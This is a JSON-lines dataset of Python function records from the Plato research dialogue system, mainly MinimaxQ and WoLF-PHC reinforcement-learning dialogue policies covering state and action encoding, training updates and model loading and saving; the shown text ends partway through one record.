{"docstring": "\"\"\"\nRe-initialize relevant parameters / variables at the beginning of each\ndialogue.\n\n:return: nothing\n\"\"\"\n\n", "func_signal": "def restart(self, args):\n", "code": "if self.agent_role == 'user' and self.warmup_simulator:\n    if 'goal' in args:\n        self.warmup_simulator.initialize(args)\n    else:\n        print('WARNING! No goal provided for WoLF PHC policy user '\n              'simulator @ restart')\n        self.warmup_simulator.initialize({})", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nLoad the model from the path provided\n\n:param path: path to load the model from\n:return: nothing\n\"\"\"\n\n", "func_signal": "def load(self, path):\n", "code": "if not path:\n    print('No dialogue_policy loaded.')\n    return\n\nif isinstance(path, str):\n    if os.path.isfile(path):\n        with open(path, 'rb') as file:\n            obj = pickle.load(file)\n\n            if 'Q' in obj:\n                self.Q = obj['Q']\n            if 'V' in obj:\n                self.V = obj['V']\n            if 'pi' in obj:\n                self.pi = obj['pi']\n            if 'a' in obj:\n                self.alpha = obj['a']\n            if 'e' in obj:\n                self.epsilon = obj['e']\n            if 'g' in obj:\n                self.gamma = obj['g']\n\n            print('Q dialogue_policy loaded from {0}.'.format(path))\n\n    else:\n        print('Warning! Q dialogue_policy file %s not found' % path)\nelse:\n    print('Warning! Unacceptable value for Q policy file name: %s '\n          % path)", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nInitialize parameters and internal structures\n\n:param args: the policy's arguments\n\"\"\"\n\n", "func_signal": "def __init__(self, args):\n", "code": "super(MinimaxQPolicy, self).__init__()\n\nself.ontology = None\nif 'ontology' in args:\n    ontology = args['ontology']\n\n    if isinstance(ontology, Ontology):\n        self.ontology = ontology\n    else:\n        raise ValueError('MinimaxQPolicy dialogue_policy Unacceptable '\n                         'ontology type %s ' % ontology)\nelse:\n    raise ValueError('MinimaxQPolicy dialogue_policy: No ontology '\n                     'provided')\n\nself.database = None\nif 'database' in args:\n    database = args['database']\n\n    if isinstance(database, DataBase):\n        self.database = database\n    else:\n        raise ValueError('MinimaxQPolicy policy: Unacceptable '\n                         'database type %s ' % database)\nelse:\n    raise ValueError('MinimaxQPolicy policy: No database '\n                     'provided')\n\nself.agent_id = args['agent_id'] if 'agent_id' in args else 0\nself.agent_role = \\\n    args['agent_role'] if 'agent_role' in args else 'system'\n\nself.alpha = args['alpha'] if 'alpha' in args else 0.2\nself.gamma = args['gamma'] if 'gamma' in args else 0.95\nself.epsilon = args['epsilon'] if 'epsilon' in args else 0.95\nself.alpha_decay = \\\n    args['alpha_decay'] if 'alpha_decay' in args else 0.995\nself.epsilon_decay = \\\n    args['epsilon_decay'] if 'epsilon_decay' in args else 0.9995\n\nself.is_training = False\n\nself.Q = {}\nself.V = {}\nself.pi = {}\n\nself.pp = pprint.PrettyPrinter(width=160)     # For debug!\n\n# System and user expert policies (optional)\nself.warmup_policy = None\nself.warmup_simulator = None\n\nif self.agent_role == 'system':\n    # Put your system expert dialogue_policy here\n    self.warmup_policy = \\\n        slot_filling_policy.HandcraftedPolicy({\n            'ontology': self.ontology})\n\nelif self.agent_role == 'user':\n    usim_args = \\\n        dict(\n            zip(['ontology', 'database'],\n                [self.ontology, self.database]))\n    # Put your user expert dialogue_policy here\n    self.warmup_simulator = AgendaBasedUS(usim_args)\n\n# Sub-case for CamRest\nself.dstc2_acts_sys = self.dstc2_acts_usr = None\n\n# Plato does not use action masks (rules to define which\n# actions are valid from each state) and so training can\n# be harder. This becomes easier if we have a smaller\n# action set.\n\n# Does not include inform and request that are modelled together with\n# their arguments\nself.dstc2_acts_sys = ['offer', 'canthelp', 'affirm', 'deny', 'ack',\n                       'bye', 'reqmore', 'welcomemsg', 'expl-conf',\n                       'select', 'repeat', 'confirm-domain', 'confirm']\n\n# Does not include inform and request that are modelled together with\n# their arguments\nself.dstc2_acts_usr = ['affirm', 'negate', 'deny', 'ack', 'thankyou',\n                       'bye', 'reqmore', 'hello', 'expl-conf',\n                       'repeat', 'reqalts', 'restart', 'confirm']\n\n# Extract lists of slots that are frequently used\nself.informable_slots = \\\n    deepcopy(list(self.ontology.ontology['informable'].keys()))\nself.requestable_slots = \\\n    deepcopy(self.ontology.ontology['requestable'])\nself.system_requestable_slots = \\\n    deepcopy(self.ontology.ontology['system_requestable'])\n\nif self.dstc2_acts_sys:\n    if self.agent_role == 'system':\n        self.NActions = \\\n            len(self.dstc2_acts_sys) + \\\n            len(self.requestable_slots) + \\\n            len(self.system_requestable_slots)\n\n        self.NOtherActions = \\\n            len(self.dstc2_acts_usr) + \\\n            2 * len(self.requestable_slots)\n\n    elif self.agent_role == 'user':\n        self.NActions = \\\n            len(self.dstc2_acts_usr) + \\\n            2 * len(self.requestable_slots)\n\n        self.NOtherActions = \\\n            len(self.dstc2_acts_sys) + \\\n            len(self.requestable_slots) + \\\n            len(self.system_requestable_slots)\nelse:\n    if self.agent_role == 'system':\n        self.NActions = \\\n            5 + \\\n            len(self.ontology.ontology['system_requestable']) + \\\n            len(self.ontology.ontology['requestable'])\n\n        self.NOtherActions = \\\n            4 + 2 * len(self.ontology.ontology['requestable'])\n\n    elif self.agent_role == 'user':\n        self.NActions = \\\n            4 + 2 * len(self.ontology.ontology['requestable'])\n        self.NOtherActions = \\\n            5 + len(self.ontology.ontology['system_requestable']) + \\\n            len(self.ontology.ontology['requestable'])", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nTrain the model using WoLF-PHC.\n\n:param dialogues: a list dialogues, which is a list of dialogue turns\n                 (state, action, reward triplets).\n:return:\n\"\"\"\n\n", "func_signal": "def train(self, dialogues):\n", "code": "if not self.is_training:\n    return\n\nfor dialogue in dialogues:\n    if len(dialogue) > 1:\n        dialogue[-2]['reward'] = dialogue[-1]['reward']\n\n    for turn in dialogue:\n        state_enc = self.encode_state(turn['state'])\n        new_state_enc = self.encode_state(turn['new_state'])\n\n        role = self.agent_role\n        if 'role' in turn:\n            role = turn['role']\n\n        action_enc = \\\n            self.encode_action(\n                turn['action'],\n                role == 'system')\n\n        # Skip unrecognised actions\n        if action_enc < 0 or turn['action'][0].intent == 'bye':\n            continue\n\n        if state_enc not in self.Q:\n            self.Q[state_enc] = [0] * self.NActions\n\n        if new_state_enc not in self.Q:\n            self.Q[new_state_enc] = [0] * self.NActions\n\n        if state_enc not in self.pi:\n            self.pi[state_enc] = \\\n                [float(1/self.NActions)] * self.NActions\n\n        if state_enc not in self.mean_pi:\n            self.mean_pi[state_enc] = \\\n                [float(1/self.NActions)] * self.NActions\n\n        if state_enc not in self.state_counter:\n            self.state_counter[state_enc] = 1\n        else:\n            self.state_counter[state_enc] += 1\n\n        # Update Q\n        self.Q[state_enc][action_enc] = \\\n            ((1 - self.alpha) * self.Q[state_enc][action_enc]) + \\\n            self.alpha * (\n                    turn['reward'] +\n                    (self.gamma * np.max(self.Q[new_state_enc])))\n\n        # Update mean dialogue_policy estimate\n        for a in range(self.NActions):\n            self.mean_pi[state_enc][a] = \\\n                self.mean_pi[state_enc][a] + \\\n                ((1.0 / self.state_counter[state_enc]) *\n                 (self.pi[state_enc][a] - self.mean_pi[state_enc][a]))\n\n        # Determine delta\n        sum_policy = 0.0\n        sum_mean_policy = 0.0\n\n        for a in range(self.NActions):\n            sum_policy = sum_policy + (self.pi[state_enc][a] *\n                                       self.Q[state_enc][a])\n            sum_mean_policy = \\\n                sum_mean_policy + \\\n                (self.mean_pi[state_enc][a] * self.Q[state_enc][a])\n\n        if sum_policy > sum_mean_policy:\n            delta = self.d_win\n        else:\n            delta = self.d_lose\n\n        # Update dialogue_policy estimate\n        max_q_idx = np.argmax(self.Q[state_enc])\n\n        d_plus = delta\n        d_minus = ((-1.0) * d_plus) / (self.NActions - 1.0)\n\n        for a in range(self.NActions):\n            if a == max_q_idx:\n                self.pi[state_enc][a] = \\\n                    min(1.0, self.pi[state_enc][a] + d_plus)\n            else:\n                self.pi[state_enc][a] = \\\n                    max(0.0, self.pi[state_enc][a] + d_minus)\n\n        # Constrain pi to a legal probability distribution\n        sum_pi = sum(self.pi[state_enc])\n        for a in range(self.NActions):\n            self.pi[state_enc][a] /= sum_pi\n\n# Decay learning rate after each episode\nif self.alpha > 0.001:\n    self.alpha *= self.alpha_decay_rate\n\n# Decay exploration rate after each episode\nif self.epsilon > 0.25:\n    self.epsilon *= self.exploration_decay_rate\n\nprint('[alpha: {0}, epsilon: {1}]'.format(self.alpha, self.epsilon))", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nInitialize internal parameters\n\n:return: Nothing\n\"\"\"\n\n", "func_signal": "def initialize(self, args):\n", "code": "if 'is_training' in args:\n    self.is_training = bool(args['is_training'])\n\n    if self.agent_role == 'user' and self.warmup_simulator:\n        if 'goal' in args:\n            self.warmup_simulator.initialize({args['goal']})\n        else:\n            print('WARNING ! No goal provided for Minimax Q policy '\n                  'user simulator @ initialize')\n            self.warmup_simulator.initialize({})", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nEncode the action, given the role. Note that does not have to match\nthe agent's role, as the agent may be encoding another agent's action\n(e.g. a system encoding the previous user act).\n\n:param actions: actions to be encoded\n:param system: whether the role whose action we are encoding is a\n               'system'\n:return: the encoded action\n\"\"\"\n\n# TODO: Handle multiple actions\n", "func_signal": "def encode_action(self, actions, system=True):\n", "code": "if not actions:\n    print('WARNING: MinimaxQ policy action encoding called '\n          'with empty actions list (returning -1).')\n    return -1\n\naction = actions[0]\n\nif system:\n    if self.dstc2_acts_sys and action.intent in self.dstc2_acts_sys:\n        return self.dstc2_acts_sys.index(action.intent)\n\n    if action.intent == 'request':\n        return len(self.dstc2_acts_sys) + \\\n               self.system_requestable_slots.index(\n                   action.params[0].slot)\n\n    if action.intent == 'inform':\n        return len(self.dstc2_acts_sys) + \\\n               len(self.system_requestable_slots) + \\\n               self.requestable_slots.index(\n                   action.params[0].slot)\nelse:\n    if self.dstc2_acts_usr and action.intent in self.dstc2_acts_usr:\n        return self.dstc2_acts_usr.index(action.intent)\n\n    if action.intent == 'request':\n        return len(self.dstc2_acts_usr) + \\\n               self.requestable_slots.index(action.params[0].slot)\n\n    if action.intent == 'inform':\n        return len(self.dstc2_acts_usr) + \\\n               len(self.requestable_slots) + \\\n               self.system_requestable_slots.index(\n                   action.params[0].slot)\n\nif (self.agent_role == 'system') == system:\n    print(\n        'MinimaxQ ({0}) policy action encoder warning: Selecting '\n        'default action (unable to encode: {1})!'.format(\n            self.agent_role, action))\nelse:\n    print(\n        'MinimaxQ ({0}) policy action encoder warning: Selecting '\n        'default action (unable to encode other agent action: '\n        '{1})!'.format(self.agent_role, action))\n\nreturn -1", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nTrain the model using MinimaxQ.\n\n:param dialogues: a list dialogues, which is a list of dialogue turns\n                  (state, action, reward triplets).\n:return:\n\"\"\"\n\n", "func_signal": "def train(self, dialogues):\n", "code": "if not self.is_training:\n    return\n\nfor dialogue in dialogues:\n    if len(dialogue) > 1:\n        dialogue[-2]['reward'] = dialogue[-1]['reward']\n\n    for turn in dialogue:\n        state_enc = self.encode_state(turn['state'])\n        new_state_enc = self.encode_state(turn['new_state'])\n        action_enc = \\\n            self.encode_action(\n                turn['action'],\n                self.agent_role == 'system')\n        other_action_enc = \\\n            self.encode_action(\n                turn['state'].user_acts,\n                self.agent_role != 'system')\n\n        if action_enc < 0 or other_action_enc < 0 or \\\n                turn['action'][0].intent == 'bye':\n            continue\n\n        if state_enc not in self.Q:\n            self.Q[state_enc] = []\n\n            for oa in range(self.NOtherActions):\n                self.Q[state_enc].append([])\n\n                for a in range(self.NActions):\n                    self.Q[state_enc][oa].append(1)\n\n        if state_enc not in self.pi:\n            self.pi[state_enc] = float(1/self.NActions)\n\n        if action_enc not in self.Q[state_enc][other_action_enc]:\n            self.Q[state_enc][other_action_enc][action_enc] = 0\n\n        if new_state_enc not in self.V:\n            self.V[new_state_enc] = 0\n\n        if new_state_enc not in self.pi:\n            self.pi[new_state_enc] = float(1/self.NActions)\n\n        delta = turn['reward'] + self.gamma * self.V[new_state_enc]\n\n        # Only update Q values (actor) that lead to an increase in Q\n        # if delta > self.Q[state_enc][other_action_enc][action_enc]:\n        self.Q[state_enc][other_action_enc][action_enc] += \\\n            self.alpha * delta\n\n        # Update V (critic)\n        self.V[state_enc] = self.maxmin(state_enc)\n\n# Decay learning rate after each episode\nif self.alpha > 0.001:\n    self.alpha *= self.alpha_decay\n\n# Decay exploration rate after each episode\nif self.epsilon > 0.25:\n    self.epsilon *= self.epsilon_decay\n\nprint('MiniMaxQ [alpha: {0}, epsilon: {1}]'\n      .format(self.alpha, self.epsilon))", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nDecode the action, given the role. Note that does not have to match\nthe agent's role, as the agent may be decoding another agent's action\n(e.g. a system decoding the previous user act).\n\n:param action_enc: action encoding to be decoded\n:param system: whether the role whose action we are decoding is a\n               'system'\n:return: the decoded action\n\"\"\"\n\n", "func_signal": "def decode_action(self, action_enc, system=True):\n", "code": "if system:\n    if action_enc < len(self.dstc2_acts_sys):\n        return [DialogueAct(self.dstc2_acts_sys[action_enc], [])]\n    \n    if action_enc < len(self.dstc2_acts_sys) + \\\n            len(self.system_requestable_slots):\n        return [DialogueAct(\n            'request',\n            [DialogueActItem(\n                self.system_requestable_slots[\n                    action_enc-len(self.dstc2_acts_sys)],\n                Operator.EQ,\n                '')])]\n\n    if action_enc < len(self.dstc2_acts_sys) + \\\n            len(self.system_requestable_slots) + \\\n            len(self.requestable_slots):\n        index = \\\n            action_enc - len(self.dstc2_acts_sys) - \\\n            len(self.system_requestable_slots)\n        return [DialogueAct(\n            'inform',\n            [DialogueActItem(\n                self.requestable_slots[index],\n                Operator.EQ,\n                '')])]\n\nelse:\n    if action_enc < len(self.dstc2_acts_usr):\n        return [DialogueAct(self.dstc2_acts_usr[action_enc], [])]\n    \n    if action_enc < len(self.dstc2_acts_usr) + \\\n            len(self.requestable_slots):\n        return [DialogueAct(\n            'request',\n            [DialogueActItem(\n                self.requestable_slots[\n                    action_enc-len(self.dstc2_acts_usr)],\n                Operator.EQ,\n                '')])]\n\n    if action_enc < len(self.dstc2_acts_usr) + \\\n            len(self.requestable_slots) + \\\n            len(self.system_requestable_slots):\n        return [DialogueAct(\n            'inform',\n            [DialogueActItem(\n                self.system_requestable_slots[\n                    action_enc-len(self.dstc2_acts_usr) -\n                    len(self.requestable_slots)],\n                Operator.EQ,\n                '')])]\n\n# Default fall-back action\nprint('WoLF-PHC dialogue_policy ({0}) policy action decoder warning: '\n      'Selecting repeat() action (index: {1})!'\n      .format(self.agent_role, action_enc))\nreturn [DialogueAct('repeat', [])]", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nSaves the experience to a file.\n\n:param path: the file path to be saved\n:return: nothing\n\"\"\"\n\n", "func_signal": "def save(self, path=None):\n", "code": "if not path:\n    path = self.path\n\n    # If the directory does not exist, create it\n    if not os.path.exists(os.path.dirname(self.path)):\n        os.makedirs(os.path.dirname(self.path), exist_ok=True)\n\nif not path:\n    # Get path to root Plato directory\n    path_to_here = os.path.dirname(os.path.abspath(__file__))\n    path_to_root = '/'.join(path_to_here.split('/')[:-2])\n\n    os.mkdir('logs/')\n\n    path = \\\n        path_to_root + \\\n        f'/logs/Dialogues{datetime.datetime.now().isoformat()}.pkl'\n\n    print('No Log file name provided. Using default: {0}'.format(path))\n\nobj = {'dialogues': self.dialogues}\n\ntry:\n    with open(path, 'wb') as file:\n        pickle.dump(obj, file, pickle.HIGHEST_PROTOCOL)\n\nexcept IOError:\n    raise IOError('Dialogue Episode Recorder I/O Error when '\n                  'attempting to save!')", "path": "plato\\utilities\\dialogue_episode_recorder.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nEncodes the dialogue state into an index used to address the Q matrix.\n\n:param state: the state to encode\n:return: int - a unique state encoding\n\"\"\"\n\n", "func_signal": "def encode_state(self, state):\n", "code": "temp = [int(state.is_terminal_state)]\n\ntemp.append(1) if state.system_made_offer else temp.append(0)\n\nif self.agent_role == 'user':\n    # The user agent needs to know which constraints and requests\n    # need to be communicated and which of them\n    # actually have.\n    if state.user_goal:\n        for c in self.informable_slots:\n            if c != 'name':\n                if c in state.user_goal.constraints and \\\n                        state.user_goal.constraints[c].value:\n                    temp.append(1)\n                else:\n                    temp.append(0)\n\n                if c in state.user_goal.actual_constraints and \\\n                        state.user_goal.actual_constraints[c].value:\n                    temp.append(1)\n                else:\n                    temp.append(0)\n\n        for r in self.requestable_slots:\n            if r in state.user_goal.requests:\n                temp.append(1)\n            else:\n                temp.append(0)\n\n            if r in state.user_goal.actual_requests and \\\n                    state.user_goal.actual_requests[r].value:\n                temp.append(1)\n            else:\n                temp.append(0)\n\n    else:\n        temp += \\\n            [0] * 2*(len(self.informable_slots)-1 +\n                     len(self.requestable_slots))\n\nif self.agent_role == 'system':\n    for value in state.slots_filled.values():\n        # This contains the requested slot\n        temp.append(1) if value else temp.append(0)\n\n    for r in self.requestable_slots:\n        temp.append(1) if r == state.requested_slot else temp.append(0)\n\n# Encode state\nstate_enc = 0\nfor t in temp:\n    state_enc = (state_enc << 1) | t\n\nreturn state_enc", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nLoad the dialogue_policy model from the path provided\n\n:param path: path to load the model from\n:return:\n\"\"\"\n\n", "func_signal": "def load(self, path=None):\n", "code": "if not path:\n    print('No dialogue_policy loaded.')\n    return\n\nif isinstance(path, str):\n    if os.path.isfile(path):\n        with open(path, 'rb') as file:\n            obj = pickle.load(file)\n\n            if 'Q' in obj:\n                self.Q = obj['Q']\n            if 'pi' in obj:\n                self.pi = obj['pi']\n            if 'mean_pi' in obj:\n                self.mean_pi = obj['mean_pi']\n            if 'state_counter' in obj:\n                self.state_counter = obj['state_counter']\n            if 'a' in obj:\n                self.alpha = obj['a']\n            if 'e' in obj:\n                self.epsilon = obj['e']\n            if 'g' in obj:\n                self.gamma = obj['g']\n\n            print('WoLF-PHC dialogue_policy loaded from {0}.'\n                  .format(path))\n\n    else:\n        print('Warning! WoLF-PHC dialogue_policy file %s not found'\n              % path)\nelse:\n    print('Warning! Unacceptable value for WoLF-PHC policy file name:'\n          ' %s ' % path)", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nEncodes the dialogue state into an index used to address the Q matrix.\n\n:param state: the state to encode\n:return: int - a unique state encoding\n\"\"\"\n", "func_signal": "def encode_state(self, state):\n", "code": "temp = [int(state.is_terminal_state)]\n\ntemp.append(1) if state.system_made_offer else temp.append(0)\n\n# If the agent plays the role of the user it needs access to its own\n# goal\nif self.agent_role == 'user':\n    # The user agent needs to know which constraints and requests need\n    # to be communicated and which of them\n    # actually have.\n    if state.user_goal:\n        found_unanswered_constr = False\n        found_unanswered_req = False\n\n        for c in self.informable_slots:\n            if c != 'name':\n                if c in state.user_goal.constraints and \\\n                        c not in state.user_goal.actual_constraints:\n                    found_unanswered_constr = True\n                    break\n\n        for r in self.requestable_slots:\n            if r in state.user_goal.requests and \\\n                    not state.user_goal.requests[r].value:\n                found_unanswered_req = True\n                break\n\n        temp += \\\n            [int(found_unanswered_constr), int(found_unanswered_req)]\n    else:\n        temp += [0, 0]\n\nif self.agent_role == 'system':\n    temp.append(int(state.is_terminal()))\n    temp.append(int(state.system_made_offer))\n\n    for value in state.slots_filled.values():\n        # This contains the requested slot\n        temp.append(1) if value else temp.append(0)\n\n    for r in self.requestable_slots:\n        temp.append(1) if r == state.requested_slot else temp.append(0)\n\nstate_enc = 0\nfor t in temp:\n    state_enc = (state_enc << 1) | t\n\nreturn state_enc", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nRe-initialize relevant parameters / variables at the beginning of each\ndialogue.\n\n:return:\n\"\"\"\n\n", "func_signal": "def restart(self, args):\n", "code": "if self.agent_role == 'user' and self.warmup_simulator:\n    if 'goal' in args:\n        self.warmup_simulator.initialize(args)\n    else:\n        print('WARNING! No goal provided for Minimax Q policy user '\n              'simulator @ restart')\n        self.warmup_simulator.initialize({})", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nDecode the action, given the role. Note that does not have to match\nthe agent's role, as the agent may be decoding another agent's action\n(e.g. a system decoding the previous user act).\n\n:param action_enc: action encoding to be decoded\n:param system: whether the role whose action we are decoding is a\n               'system'\n:return: the decoded action\n\"\"\"\n\n", "func_signal": "def decode_action(self, action_enc, system=True):\n", "code": "if system:\n    if action_enc < len(self.dstc2_acts_sys):\n        return [DialogueAct(self.dstc2_acts_sys[action_enc], [])]\n\n    if action_enc < len(self.dstc2_acts_sys) + \\\n            len(self.system_requestable_slots):\n        return [DialogueAct(\n            'request',\n            [DialogueActItem(\n                self.system_requestable_slots[\n                    action_enc - len(self.dstc2_acts_sys)],\n                Operator.EQ,\n                '')])]\n\n    if action_enc < len(self.dstc2_acts_sys) + \\\n            len(self.system_requestable_slots) + \\\n            len(self.requestable_slots):\n        index = \\\n            action_enc - len(self.dstc2_acts_sys) - \\\n            len(self.system_requestable_slots)\n        return [DialogueAct(\n            'inform',\n            [DialogueActItem(\n                self.requestable_slots[index],\n                Operator.EQ,\n                '')])]\n\nelse:\n    if action_enc < len(self.dstc2_acts_usr):\n        return [DialogueAct(self.dstc2_acts_usr[action_enc], [])]\n\n    if action_enc < len(self.dstc2_acts_usr) + \\\n            len(self.requestable_slots):\n        return [DialogueAct(\n            'request',\n            [DialogueActItem(\n                self.requestable_slots[\n                    action_enc - len(self.dstc2_acts_usr)],\n                Operator.EQ,\n                '')])]\n\n    if action_enc < len(self.dstc2_acts_usr) + \\\n            len(self.requestable_slots) + \\\n            len(self.system_requestable_slots):\n        return [DialogueAct(\n            'inform',\n            [DialogueActItem(\n                self.system_requestable_slots[\n                    action_enc - len(self.dstc2_acts_usr) -\n                    len(self.requestable_slots)],\n                Operator.EQ,\n                '')])]\n\n# Default fall-back action\nprint(\n    'MinimaxQ dialogue_policy ({0}) policy action decoder warning: '\n    'Selecting repeat() action '\n    '(index: {1})!'.format(self.agent_role, action_enc))\nreturn [DialogueAct('repeat', [])]", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nConsults the dialogue_policy to produce the agent's response\n\n:param state: the current dialogue state\n:return: a list of dialogue acts, representing the agent's response\n\"\"\"\n\n", "func_signal": "def next_action(self, state):\n", "code": "state_enc = self.encode_state(state)\nself.statistics['total_turns'] += 1\n\nif state_enc not in self.pi or \\\n        (self.is_training and random.random() < self.epsilon):\n    if not self.is_training:\n        if not self.pi:\n            print(f'\\nWARNING! WoLF-PHC pi is empty '\n                  f'({self.agent_role}). Did you load the correct '\n                  f'file?\\n')\n        else:\n            print(f'\\nWARNING! WoLF-PHC state not found in policy '\n                  f'pi ({self.agent_role}).\\n')\n\n    if random.random() < 0.35:\n        print('--- {0}: Selecting warmup action.'\n              .format(self.agent_role))\n        self.statistics['supervised_turns'] += 1\n\n        if self.agent_role == 'system':\n            return self.warmup_policy.next_action(state)\n\n        else:\n            self.warmup_simulator.receive_input(\n                state.user_acts, state.user_goal)\n            return self.warmup_simulator.respond()\n    else:\n        print(\n            '--- {0}: Selecting random action.'.format(self.agent_role)\n        )\n        return self.decode_action(\n            random.choice(range(0, self.NActions)),\n            self.agent_role == 'system')\n\nif self.IS_GREEDY_POLICY:\n    # Get greedy action\n    max_pi = max(self.pi[state_enc][:-1])  # Do not consider 'UNK'\n    maxima = \\\n        [i for i, j in enumerate(self.pi[state_enc]) if j == max_pi]\n\n    # Break ties randomly\n    if maxima:\n        sys_acts = \\\n            self.decode_action(random.choice(maxima),\n                               self.agent_role == 'system')\n    else:\n        print('--- {0}: Warning! No maximum value identified for '\n              'dialogue policy. Selecting random action.'\n              .format(self.agent_role))\n\n        return self.decode_action(\n            random.choice(range(0, self.NActions)),\n            self.agent_role == 'system')\nelse:\n    # Sample next action\n    sys_acts = \\\n        self.decode_action(\n            random.choices(range(len(self.pi[state_enc])),\n                           self.pi[state_enc])[0],\n            self.agent_role == 'system')\n\nreturn sys_acts", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nSolve the maxmin problem\n\n:param state_enc: the encoding to the state\n:param retry:\n:return:\n\"\"\"\n\n", "func_signal": "def maxmin(self, state_enc, retry=False):\n", "code": "c = np.zeros(self.NActions + 1)\nc[0] = -1\nA_ub = np.ones((self.NOtherActions, self.NActions + 1))\nA_ub[:, 1:] = -np.asarray(self.Q[state_enc])\nb_ub = np.zeros(self.NOtherActions)\nA_eq = np.ones((1, self.NActions + 1))\nA_eq[0, 0] = 0\nb_eq = [1]\nbounds = ((None, None),) + ((0, 1),) * self.NActions\n\nres = linprog(c, A_ub=A_ub, b_ub=b_ub, A_eq=A_eq,\n              b_eq=b_eq, bounds=bounds)\n\nif res.success:\n    self.pi[state_enc] = res.x[1:]\nelif not retry:\n    return self.maxmin(state_enc, retry=True)\nelse:\n    print(\"Alert : %s\" % res.message)\n    if state_enc in self.V:\n        return self.V[state_enc]\n    else:\n        print('Warning, state not in V, returning 0.')\n        return 0\n\nreturn res.x[0]", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\minimax_q_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\n\n:param args:\n:return:\n\"\"\"\n\n# Unpack args\n", "func_signal": "def generate_output(self, args=None):\n", "code": "if isinstance(args, dict):\n    if 'args' in args:\n        args = args['args']\n\n    else:\n        raise ValueError('DialoguePolicy: unacceptable input!')\n\nreturn self.next_action(args)", "path": "plato\\agent\\component\\dialogue_policy\\dialogue_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nEncode the action, given the role. Note that does not have to match\nthe agent's role, as the agent may be encoding another agent's action\n(e.g. a system encoding the previous user act).\n\n:param actions: actions to be encoded\n:param system: whether the role whose action we are encoding is a\n               'system'\n:return: the encoded action\n\"\"\"\n\n# TODO: Handle multiple actions\n", "func_signal": "def encode_action(self, actions, system=True):\n", "code": "if not actions:\n    print('WARNING: WoLF-PHC dialogue_policy action encoding called '\n          'with empty actions list (returning -1).')\n    return -1\n\naction = actions[0]\n\nif system:\n    if self.dstc2_acts_sys and action.intent in self.dstc2_acts_sys:\n        return self.dstc2_acts_sys.index(action.intent)\n\n    if action.intent == 'request':\n        if action.params[0].slot not in self.system_requestable_slots:\n            return -1\n\n        return len(self.dstc2_acts_sys) + \\\n               self.system_requestable_slots.index(\n                   action.params[0].slot)\n\n    if action.intent == 'inform':\n        if action.params[0].slot not in self.requestable_slots:\n            return -1\n\n        return len(self.dstc2_acts_sys) + \\\n               len(self.system_requestable_slots) + \\\n               self.requestable_slots.index(action.params[0].slot)\nelse:\n    if self.dstc2_acts_usr and action.intent in self.dstc2_acts_usr:\n        return self.dstc2_acts_usr.index(action.intent)\n\n    if action.intent == 'request':\n        if action.params[0].slot not in self.requestable_slots:\n            return -1\n\n        return len(self.dstc2_acts_usr) + \\\n               self.requestable_slots.index(action.params[0].slot)\n\n    if action.intent == 'inform':\n        if action.params[0].slot not in self.system_requestable_slots:\n            return -1\n\n        return len(self.dstc2_acts_usr) + \\\n               len(self.requestable_slots) + \\\n               self.system_requestable_slots.index(\n                   action.params[0].slot)\n\nif (self.agent_role == 'system') == 